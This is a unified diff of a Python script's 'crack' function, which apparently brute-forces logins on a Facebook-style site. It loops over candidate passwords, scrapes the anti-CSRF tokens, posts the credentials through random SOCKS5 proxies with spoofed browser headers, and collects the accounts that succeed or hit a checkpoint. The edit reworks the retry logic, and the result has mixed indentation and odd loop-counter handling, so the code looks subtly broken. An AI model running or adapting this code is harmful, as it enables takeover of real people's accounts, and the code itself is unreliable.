@@ -649,24 +649,25 @@ def crack(idf,pwx,url,awal):
 	proxy = {'http': 'socks5://'+random.choice(xx)}
 	ahir = str(datetime.now()-awal).split('.')[0]
 	print(f"\r [{hh}!{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
-	for pw in pwx:
-		try:
+	try:
+                loop+=1
+		for pw in pwx:
 			link = ses.get(f'https://{url}/login/?source=auth_switcher')
 			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
-			hd2 = {"Host":url,
-				"user-agent":ua,
-				"accept":"*/*",
-				"content-type":"application/x-www-form-urlencoded",
-				"origin":f"https://"+url,
-				"referer":f"https://'+url+'/login/?source=auth_switcher",
-				'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
-				"sec-ch-ua-mobile": "?0",
-				"sec-fetch-site":"same-origin",
-				"sec-fetch-mode":"cors",
-				"sec-fetch-dest":"empty",
-				"accept-encoding":"gzip, deflate, br",
-				"accept-language":"id,en-US;q=0.9,en;q=0.8",
-				"x-requested-with":"XMLHttpRequest"
+			hd2 = {'Host':url,
+				'user-agent':ua,
+				'accept':'*/*',
+				'content-type':'application/x-www-form-urlencoded',
+				'origin':f"https://"+url,
+				'referer':f'https://'+url+'/login/?source=auth_switcher',
+				'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not) A Brand";v="99"',
+				'sec-ch-ua-mobile': '?0',
+				'sec-fetch-site':'same-origin',
+				'sec-fetch-mode':'cors',
+				'sec-fetch-dest':'empty',
+				'accept-encoding':'gzip, deflate, br',
+				'accept-language':'id,en-US;q=0.9,en;q=0.8',
+				'x-requested-with':'XMLHttpRequest',
 			}
 			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=hd2, data=date, proxies=proxy)
 			if "checkpoint" in ses.cookies.get_dict():
@@ -711,10 +712,9 @@ def crack(idf,pwx,url,awal):
 				resok.append(data)
 			else:
 				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-			crack(idf,pwx,url,awal)
-	loop+=1
+	except:
+		crack(idf,pwx,url,awal)
+                loop-=1
 	
 	
 ###---[ CONVERT COOKIE ]---###
